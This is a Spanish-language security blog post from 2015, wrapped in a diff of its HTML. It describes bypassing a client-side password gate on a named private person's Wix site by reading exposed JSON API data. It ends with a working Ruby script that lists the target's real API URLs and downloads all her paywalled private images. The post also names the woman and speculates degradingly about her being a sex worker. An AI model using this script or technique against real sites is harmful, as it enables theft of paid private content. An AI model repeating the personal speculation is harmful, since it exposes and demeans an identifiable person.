@@ -1,0 +1,198 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Esquivando La Seguridad De WIX.COM - Security Signal</title>
+  <meta name="author" content="q3rv0 - hdbreaker">
+
+  
+  <meta name="description" content="by hdbreakerBuen dia queridos lectores, antes de iniciar esta entrada, quiero pedirles disculpas por estar un largoperiodo inactivo, mis &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://securitysignal.github.io/blog/2015/07/18/esquivando-la-seguridad-de-wixcom/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Security Signal" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Security Signal</a></h1>
+  
+    <h2>Looking for signs of insecurity...</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="securitysignal.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Esquivando La Seguridad De WIX.COM</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-07-18T09:45:00-07:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>9:45 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-eW5K-WFkMiA/VapmcCy4XUI/AAAAAAAAAqE/oYACvkmRGoU/s1600/wix.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="363" src="http://2.bp.blogspot.com/-eW5K-WFkMiA/VapmcCy4XUI/AAAAAAAAAqE/oYACvkmRGoU/s640/wix.jpg" width="640" /></a></div><div style="text-align: right;"><b>by hdbreaker</b></div><div style="text-align: left;"><b><br /></b></div><div style="text-align: left;">Buen dia queridos lectores, antes de iniciar esta entrada, quiero pedirles disculpas por estar un largo<br />periodo inactivo, mis responsabilidades laborales<br /><a name='more'></a> incrementaron y no he logrado hacerme un tiempo para traerles algo de calidad.<br /><br />Como introducción quiero contarles que he estado trabajando en varios proyectos en javascript (Node.js y Angular.js), esto conlleva dividir el ambiente de trabajo en 2 partes (Backend y FrontEnd) que se comunican por medio de un API.<br /><br />Este API utiliza como en capa de transporte el famoso formato JSON (JavaScript Object Notation), el cual solo permite ser cifrado por SSL ya que para comunicarnos debidamente necesitamos establecer en el HEADER HTTP el <b>Content-Type: application/json </b>y al cifrarlo de alguna manera rompemos la estructura de comunicación&nbsp;<b>json </b>al transmitir texto plano encryptado.<b>&nbsp;</b><br /><br />La solución obvia era generar un certificado SSL, y pagarle a un CA autorizado para que firmara de confianza mi certificado, lo cual no era una opción ya que el ambiente aun esta en desarrollo.<br /><br />La siguiente alternativa era crear mi propio servidor CA, firmar el certificado y colocar mi CA en el circulo de confianza de las maquinas de desarrollo.</div><div style="text-align: left;"><br /></div><div style="text-align: left;"><br /></div><div style="text-align: left;">Ninguna de estas opciones me convencía, por lo cual decidí crear un middleware en nodejs, que capturara todos los request encriptados del cliente (browser) y les pasara una funcion propia de desencriptación y convertir el string nuevamente a un objeto json.</div><div style="text-align: left;"><br /></div><div style="text-align: left;">De esta forma al llegar la solicitud al controllador correspondiente lo manejaría de forma transparente como si el objeto JSON nunca hubiera sido encriptado.<br /><br />Luego de resolver este problema de comunicación decidí distraerme un poco, encendí un cigarrillo &nbsp;y comencé a leer un poco sobre las Artes Marciales Mixtas (MMA).</div><div style="text-align: left;"><br /></div><div style="text-align: left;">Lo curioso de esto es que llegue a un sitio web de una profesora de MMA de Buenos Aires, Argentina por medio de un video en youtube donde mostraba un poco como eran sus entrenamientos.</div><div style="text-align: left;"><br /></div><div style="text-align: center;">&nbsp;<b>....En este punto se preguntaran... que tiene que ver las APIs con el MMA....</b></div><div style="text-align: center;"><b>(paciencia)</b></div><div style="text-align: left;"><br /></div><div style="text-align: left;"><br /></div><div style="text-align: left;">El sitio al cual llegue es:&nbsp;<a href="http://www.pamelagaldos.com.ar/">http://www.pamelagaldos.com.ar/</a></div><div style="text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-EM6x1s9MpPk/VaprhwYcbqI/AAAAAAAAAqU/5pJDVqpyn1o/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-07-18%2B12%253A06%253A22.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="356" src="http://3.bp.blogspot.com/-EM6x1s9MpPk/VaprhwYcbqI/AAAAAAAAAqU/5pJDVqpyn1o/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-07-18%2B12%253A06%253A22.png" width="640" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;"><br /></div><div style="text-align: left;">Luego de ver algunos de sus videos en importantes campeonatos de MMA en Bs As. note que <b>Pamela tiene un problema...</b> oculta algo...<br /><br />El sitio posee una <b>ZONA VIP </b>la cual solicita una contraseña para poder visualizar una galeria <b>especial </b>de imagenes y videos. Para adquirir esa contraseña, la señórita <b>Galdos </b>solicita una donación por mercadopago de 100$&nbsp;<b>(pregunta retorica... una donación no es lo que uno quiere donar? parece que no... ahora las donaciones tienen monto fijo!)&nbsp;</b></div><div><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-dKqFaxgBfag/VapuB8FiEFI/AAAAAAAAAqw/8KR1bWrIOVw/s1600/ee.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="428" src="http://1.bp.blogspot.com/-dKqFaxgBfag/VapuB8FiEFI/AAAAAAAAAqw/8KR1bWrIOVw/s640/ee.png" width="640" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;"><br /></div><div style="text-align: left;">Como todo especialista en seguridad informática, no podia retirarme de este sitio sin probar un poco su privacidad, intente algunos SQLI y uno q otro XSS sin resultado.<br /><br />Luego decidí enumerar los directorios del sitio con algún crawler con el fin encontrar, sin exito, algo interesante. <b>(nada relevante algunas carpetas publicas de contenido css, js. images)</b><br /><br />En este punto ya algo cansado 6.30 am, estaba por renunciar... me levante me senté en la cama y vi mi laptop diciedome... <b>"antes solías escribir en un blog... como se llamaba? sec...cuanto?"</b></div><div style="text-align: left;"><b><br /></b></div><div style="text-align: left;">Esta terrible imagen me dio fuerzas para continuar en mi busqueda, presentía que algo se me estaba escapando!</div><div style="text-align: left;"><b><br /></b></div><div style="text-align: left;">En este punto, comencé a evaluar la seguridad en capa de comunicaciones, el formulario que me solicitaba acceso debía enviar los parametros a algún lado para realizar la validación y responderme el ya odiado "contraseña incorrecta".</div><div style="text-align: left;"><br /></div><div style="text-align: left;">Inicie HTTP Live Headers... y envíe el formulario a la espera de encontrar la ruta del fichero que realizaba la validación y seguir mi análisis por aquellos rumbos.</div><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-hU30Mj_N1Q8/Vapw9nzGIBI/AAAAAAAAAq8/nox3bFAhRCI/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-07-18%2B12%253A29%253A31.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="358" src="http://4.bp.blogspot.com/-hU30Mj_N1Q8/Vapw9nzGIBI/AAAAAAAAAq8/nox3bFAhRCI/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-07-18%2B12%253A29%253A31.png" width="640" /></a></div><div style="text-align: center;"><br /></div>Sorprendentemente la validación se realizaba con alguna función del lado del cliente, o lo que es lo mismo con Javascript!&nbsp;<b>(no me voy a cansar de decirlo nunca! estamos en el siglo XXI, validemos del lado del servidor, POR FAVOR)</b><br /><div style="text-align: left;"><br /></div><div style="text-align: left;">Puse manos a la obra y comencé a revisar el html+js de la vista principal, pero este estaba realmente sucio como forma de protección y utilizaba una suerte de reactive.js + angular.js todo sumamente minificado.</div><div class="separator" style="clear: both; text-align: center;"></div><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-fTYmEtkzDn8/VapyNH5NwEI/AAAAAAAAArE/dbOIBYSC28c/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-07-18%2B12%253A34%253A52.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="298" src="http://4.bp.blogspot.com/-fTYmEtkzDn8/VapyNH5NwEI/AAAAAAAAArE/dbOIBYSC28c/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-07-18%2B12%253A34%253A52.png" width="640" /></a></div><div style="text-align: center;"><br /></div>Mucho de los parametros del html eran generados por alguna función aleatoria, con el objetivo de complicar la lectura del código <b>(medida de seguridad)</b>.<br /><div><br /></div><div>Luego de revisar un poco el código e intentar deducir en profundidad que estaba pasando en el sitio, decidí investigar un poco en que estaba desarrollado el sitio, donde se albergaba y leer un poco de la documentación oficial de los creadores de la plataforma, con el fin de cerrar unas cuantas ideas que tenia dando vuelta en mi cabeza.<br /><br />El sitio esta montado en un servicio bastante conocido que se llama WIX, el mismo ofrece una plataforma para crear en base a distintos tipos de plantillas un sitio web custom, escalable y seguro, para desarrolladores y no desarrolladores. <b>(Una solución similar a Wordpress y Blogger).</b></div><div><b><br /></b></div><div><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-VHJgYjT1Fig/Vap09FlOFBI/AAAAAAAAArY/J41FQZ0aSfU/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-07-18%2B12%253A46%253A24.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="312" src="http://2.bp.blogspot.com/-VHJgYjT1Fig/Vap09FlOFBI/AAAAAAAAArY/J41FQZ0aSfU/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-07-18%2B12%253A46%253A24.png" width="640" /></a></div><br />WIX:&nbsp;<a href="http://es.wix.com/">http://es.wix.com/</a><br />El sitio permite acceder a distintos tipos de plugins en su apartado privado en el cual cobran dependiendo el plan necesitado.<br /><br />El plugin de ZONAS PREMIUMS/VIP de WIX resulta estar incluido en un paquete privado y de costo <b>6 USD </b>mensuales, lo que implica que muy probablemente nuestra profesora de MMA este pagando por el servicio de <b>WIX </b>el cual garantiza brindar un servicio seguro por el precio establecido.<br /><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-9jBqEob8vpE/Vap0plBf4SI/AAAAAAAAArQ/_H7kGrErna0/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-07-18%2B12%253A45%253A24.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="254" src="http://3.bp.blogspot.com/-9jBqEob8vpE/Vap0plBf4SI/AAAAAAAAArQ/_H7kGrErna0/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-07-18%2B12%253A45%253A24.png" width="640" /></a></div><div style="text-align: center;"></div><br />Para mi suerte la documentación de WIX es muy extensa y luego de leer bastante comprendí que su sistema de generación de plantillas dinámicas, esta regida por un muy extenso API, que permite desde gestionar archivos, hasta crear estilos css dinamicos, manteniendo toda la información fuera del servidor principal.<br /><br /><b>WIX DOCUMENTATION CENTER: </b><a href="http://dev.wix.com/docs/">http://dev.wix.com/docs/</a><br /><br /><div style="text-align: center;"><b><br /></b></div><div style="text-align: left;">Luego de esto no me quedaba dudas, de que el sitio: <a href="http://pamelagaldos.com.ar/">http://pamelagaldos.com.ar</a>&nbsp;estaba solicitando los datos aleatorios por medio de peticiones ajax a un API RESTFull.<br /><br />En este punto mi objetivo cambio, y decidí buscar en el sitio, la función (clase,controlador,etc) que contenía las BaseURLs del servidor de WIX para ver que sucedía.<br /><br />Al poco tiempo de buscar encontré embebido dentro de unos tags &lt;script&gt;&lt;/script&gt; algo que hacia referencia a servidores externos:</div><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-dYglXO811GA/Vap3VcctLDI/AAAAAAAAArk/EMLqJ_cHBXY/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-07-18%2B12%253A56%253A50.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="238" src="http://2.bp.blogspot.com/-dYglXO811GA/Vap3VcctLDI/AAAAAAAAArk/EMLqJ_cHBXY/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-07-18%2B12%253A56%253A50.png" width="640" /></a></div><div style="text-align: left;"><br /></div><div style="text-align: left;">Podemos ver como dentro de este script se hace referencia a serverName y alguna que otra ruta */services/* lo que prometía contener solicitudes ajax a revisar.<br /><br />El problema estaba en que el código se encontraba minificado y su lectura logica era imposible debido a la cantidad de lineas del script.<br /><br />Por suerte existe una solución que permite "revertir" el proceso de minificación, lo coloco entre comillas ya que es mas bien una reestructuración del codigo. (La minificación de js implica varias cosas mas que solo reducir todo a una linea, el proceso también genera variables random y reduce nombre de funciones a letras del abecedario, etc);</div><div style="text-align: left;"><br /></div><div style="text-align: left;">Para convertir el código ilegible a algo un poco mas coherente utilice:&nbsp;<a href="http://jsbeautifier.org/">http://jsbeautifier.org/</a>&nbsp;</div><div style="text-align: left;">Una joya en el análisis de javascript minificado.<br /><br />Como resultado obtuve un largo archivo javascript estructurado con nombres de funciones y variables poco descriptivas, luego de leer y releer bastante el código llegue a lago interesante:</div><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-VZbZG2mL2Wo/Vap5umYteHI/AAAAAAAAArw/qwdUPwYvIts/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-07-18%2B13%253A07%253A05.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="248" src="http://1.bp.blogspot.com/-VZbZG2mL2Wo/Vap5umYteHI/AAAAAAAAArw/qwdUPwYvIts/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-07-18%2B13%253A07%253A05.png" width="640" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;">Dentro del código existian algunos objetos json que tenian propiedades enbebidas que se correspondian con los elementos html del sitio.<br /><br /><b>c1flq:&nbsp;</b>correspondia al <b>id</b> del button ZONA VIP</div><div><b>title: </b>correspondia al value del button<br />y... <b>urls: </b>contenian algunas direcciones con extension <b>json! </b>probablemente conteniendo información necesaria para cada una de las zonas privadas!<br /><br /><b>Mi pregunta era... que habra en este json? el hash para compara la contraseña del form? datos bobos? información de configuración? era hora de visitarlos!</b><br /><br />en mi caso elegí realizar las pruebas con el API respectiva a una galería de la Zona VIP.<br /><br /><a href="http://fallback.wix.com/wix-html-editor-pages-webapp/page/b4dc37_9970654c91ff1e68cb136b2facf02541_70.json">http://fallback.wix.com/wix-html-editor-pages-webapp/page/b4dc37_9970654c91ff1e68cb136b2facf02541_70.json</a></div><div><br /></div><div>El API nos devuelve un array enorme de información en la cual se destaca el objeto JSON <b>"data"</b>,</div><div>el cual contiene toda la información necesaria para renderizar la vista privada de una galeria de la Zona VIP, incluyendo las imagenes y el hash de acceso:<br /><br /><div class="separator" style="clear: both; text-align: left;"><a href="http://4.bp.blogspot.com/-iLFUcmg8Irk/Vap8Sxde__I/AAAAAAAAAr8/RYGQ4SaqhcI/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-07-18%2B13%253A18%253A04.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="76" src="http://4.bp.blogspot.com/-iLFUcmg8Irk/Vap8Sxde__I/AAAAAAAAAr8/RYGQ4SaqhcI/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-07-18%2B13%253A18%253A04.png" width="640" /></a></div><div style="text-align: center;"><br /></div></div><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-GTmLbNL7_GQ/Vap8g1dM1uI/AAAAAAAAAsE/GdoIboOkRZ8/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-07-18%2B13%253A19%253A00.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="268" src="http://1.bp.blogspot.com/-GTmLbNL7_GQ/Vap8g1dM1uI/AAAAAAAAAsE/GdoIboOkRZ8/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-07-18%2B13%253A19%253A00.png" width="640" /></a></div><div><br /></div><br /><div style="text-align: left;"><b>passwordDigest: </b>el hash con el que se compara nuestra contraseña luego de algun proceso de hasheo</div><div style="text-align: left;"><b>image_119n: </b>el objeto json imagen, con el nombre aleatorio actual, de nuestra ansiada imagen privada.<br /><br />Con el nombre de la imagen secreta, solo bastaba encontrar el path donde estaban subidas las imagenes, para esto analizamos un poco mas el codigo del index, buscando los enlaces hacia las imagenes.</div><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-XVQ8oulFHWs/Vap9b5scF5I/AAAAAAAAAsM/Nof0Z2A8ZSg/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-07-18%2B13%253A22%253A58.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="42" src="http://3.bp.blogspot.com/-XVQ8oulFHWs/Vap9b5scF5I/AAAAAAAAAsM/Nof0Z2A8ZSg/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-07-18%2B13%253A22%253A58.png" width="640" /></a></div><div style="text-align: left;"><br /></div><div style="text-align: left;">Al parecer los archivos son hosteados en otro servidor de wix, funcionando en la url:<br /><span style="background-color: white; color: #222222; font-family: 'dejavu sans mono', monospace; font-size: 11px; white-space: pre-wrap;"><br /></span></div><b><a href="http://static.wixstatic.com/media/:image">http://static.wixstatic.com/media/:image</a></b></div><div><br /></div><div>Con esta ruta solo nos faltaba agregarle al final el nombre de nuestra imagen privada!<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-I8-0VefUSdw/Vap-OaVR6gI/AAAAAAAAAsY/LHJOCog9EA0/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-07-18%2B13%253A25%253A54.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="476" src="http://1.bp.blogspot.com/-I8-0VefUSdw/Vap-OaVR6gI/AAAAAAAAAsY/LHJOCog9EA0/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-07-18%2B13%253A25%253A54.png" width="640" /></a></div><div style="text-align: center;"><br /></div></div><div>Definitivamente nuestra profesora de MMA no solo pelea, sino que probablemente sea SCORT VIP de Bs As.<br /><br />En este punto todo mi día cobro sentido, estar desarrollando un sistema de cryptografía para securizar un API JSON pensando que mi nivel de paranoia estaba llegando a un punto critico, y luego encontrarse con la posibilidad de evitar un sistema de autentificación de un sitio que factura por garantizar la seguridad de los datos y negocios de los clientes, debido a que WIX no securizo y encripto los datos que viajaban por su API, me dio escalofrios.<br /><br />En fin aquí se ven dos problemas grandes de seguridad y el mayor afectado es Pamela!<br /><br />Ella cobra $100 por &nbsp;que sus clientes puedan acceder a sus imagenes HOT, y WIX le cobra $60 por un servicio inseguro que permite a terceros obtener todas las fotos de Pamela sin pagar un centavo...<br />Algo no cuadra... WIX se lleva mas del 50% de las ganancias de PAMELA sin contar los daños y perjuicios laborales que le produce a Pamela que alguien venga y vea sus fotos gratis!!!<br /><br />Alguien pensara que estoy exagerando, y para demostrar lo contrario me propuse desarrollar un script que descargara todas las fotos privadas de PAMELA &nbsp;de su Zona VIP sin pagar un centavo.<br /><br />Y como hace mucho q no jugaba con mi amigo Ruby hoy le toco a el:<br /><br />CODE<br /><br /><pre class="brush: ruby">#Esta herramienta ha sido creada con fines educativos,<br />#SecuritySignal no se hace responsable por el uso indebido de la misma.<br />require 'json'<br />require 'rest-client'<br />baseImageUrl = "http://static.wixstatic.com/media/"<br />apis = [<br />    "http://static.wixstatic.com/sites/b4dc37_a051c9896b38484b0af98d41c78aad95_70.json.z?v=3",<br />    "http://staticorigin.wixstatic.com/sites/b4dc37_a051c9896b38484b0af98d41c78aad95_70.json.z?v=3",<br />    "http://fallback.wix.com/wix-html-editor-pages-webapp/page/b4dc37_a051c9896b38484b0af98d41c78aad95_70.json",<br />    "http://static.wixstatic.com/sites/b4dc37_a26927faf95266eb3e90539795f911c7_70.json.z?v=3",<br />    "http://staticorigin.wixstatic.com/sites/b4dc37_a26927faf95266eb3e90539795f911c7_70.json.z?v=3", <br />    "http://fallback.wix.com/wix-html-editor-pages-webapp/page/b4dc37_a26927faf95266eb3e90539795f911c7_70.json",<br />    "http://static.wixstatic.com/sites/b4dc37_9970654c91ff1e68cb136b2facf02541_70.json.z?v=3",<br />    "http://staticorigin.wixstatic.com/sites/b4dc37_9970654c91ff1e68cb136b2facf02541_70.json.z?v=3",<br />    "http://fallback.wix.com/wix-html-editor-pages-webapp/page/b4dc37_9970654c91ff1e68cb136b2facf02541_70.json",<br />    "http://static.wixstatic.com/sites/b4dc37_e0b5e6e39a8f34d38d52cb117145b7a2_70.json.z?v=3", <br />    "http://staticorigin.wixstatic.com/sites/b4dc37_e0b5e6e39a8f34d38d52cb117145b7a2_70.json.z?v=3",<br />    "http://fallback.wix.com/wix-html-editor-pages-webapp/page/b4dc37_e0b5e6e39a8f34d38d52cb117145b7a2_70.json",<br />    "http://static.wixstatic.com/sites/b4dc37_c453d26b8f1ad045815c326852f6ed9e_70.json.z?v=3",<br />    "http://staticorigin.wixstatic.com/sites/b4dc37_c453d26b8f1ad045815c326852f6ed9e_70.json.z?v=3", <br />    "http://fallback.wix.com/wix-html-editor-pages-webapp/page/b4dc37_c453d26b8f1ad045815c326852f6ed9e_70.json",<br />    "http://static.wixstatic.com/sites/b4dc37_65b4d7c00981596fedcc0b29630dbd63_70.json.z?v=3", <br />    "http://staticorigin.wixstatic.com/sites/b4dc37_65b4d7c00981596fedcc0b29630dbd63_70.json.z?v=3", <br />    "http://fallback.wix.com/wix-html-editor-pages-webapp/page/b4dc37_65b4d7c00981596fedcc0b29630dbd63_70.json",<br />    "http://static.wixstatic.com/sites/b4dc37_94e133e7bdb916e1edcac338cae838e5_70.json.z?v=3",<br />    "http://staticorigin.wixstatic.com/sites/b4dc37_94e133e7bdb916e1edcac338cae838e5_70.json.z?v=3", <br />    "http://fallback.wix.com/wix-html-editor-pages-webapp/page/b4dc37_94e133e7bdb916e1edcac338cae838e5_70.json",<br />    "http://static.wixstatic.com/sites/b4dc37_55de87fc383d68f53ad84448181dccfa_70.json.z?v=3",<br />    "http://staticorigin.wixstatic.com/sites/b4dc37_55de87fc383d68f53ad84448181dccfa_70.json.z?v=3", <br />    "http://fallback.wix.com/wix-html-editor-pages-webapp/page/b4dc37_55de87fc383d68f53ad84448181dccfa_70.json",<br />    "http://static.wixstatic.com/sites/b4dc37_a50043065395619bbe15c4545cabe038_70.json.z?v=3",<br />    "http://staticorigin.wixstatic.com/sites/b4dc37_a50043065395619bbe15c4545cabe038_70.json.z?v=3",<br />    "http://fallback.wix.com/wix-html-editor-pages-webapp/page/b4dc37_a50043065395619bbe15c4545cabe038_70.json",<br />    "http://static.wixstatic.com/sites/b4dc37_edb132d4be40dee794296337c610f8f5_70.json.z?v=3", <br />    "http://staticorigin.wixstatic.com/sites/b4dc37_edb132d4be40dee794296337c610f8f5_70.json.z?v=3",<br />    "http://fallback.wix.com/wix-html-editor-pages-webapp/page/b4dc37_edb132d4be40dee794296337c610f8f5_70.json",<br />]<br /><br />jsonObjects = [];<br /><br />apis.each { |apiUrl|<br /> begin<br />   response = RestClient.get apiUrl<br />   jsonObjects.push(JSON.parse(response))<br /> rescue =&gt; e<br />   e.response<br /> end<br />  <br />}<br /><br />jsonObjects.each_with_index { |obj, i|<br />  obj['data']['document_data'].each { |data|<br />    data.each { |url|<br />      if(url['uri'])<br />        File.open('./images/'+url['uri'], 'w') do |file|<br />          response = RestClient.get baseImageUrl+url['uri']<br />          file.puts response;<br />        end<br />        puts url['uri'];<br />      end<br />    }<br />  }<br />}<br /><br /></pre><div style="text-align: right;"><b>Saludos! </b></div></div></div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Security Signal</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2015-07-18T09:45:00-07:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>9:45 am</span></time>
+      
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://securitysignal.github.io/blog/2015/07/18/esquivando-la-seguridad-de-wixcom/" data-via="" data-counturl="http://securitysignal.github.io/blog/2015/07/18/esquivando-la-seguridad-de-wixcom/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/07/09/cazador-de-botnets-zeus/" title="Previous Post: Cazador de Botnets: [Zeus]">&laquo; Cazador de Botnets: [Zeus]</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2015/09/30/eko-party-pre-ctf/" title="Next Post: EkoParty Pre CTF ">EkoParty Pre CTF  &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2016/03/08/format-string-atack/">Format String Atack</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/01/07/ringzer0-level4-pwned-by-hdbreaker/">Ringzer0 Level4 Pwned! By Hdbreaker</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/30/securitysocket-remote-exploit-library/">SecuritySocket Remote Exploit Library</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/18/desbordando-el-buffer-en-linux-x86-iv/">Desbordando El Buffer en Linux X86 (IV)</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/30/eko-party-pre-ctf/">EkoParty Pre CTF</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2016 - q3rv0 - hdbreaker -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
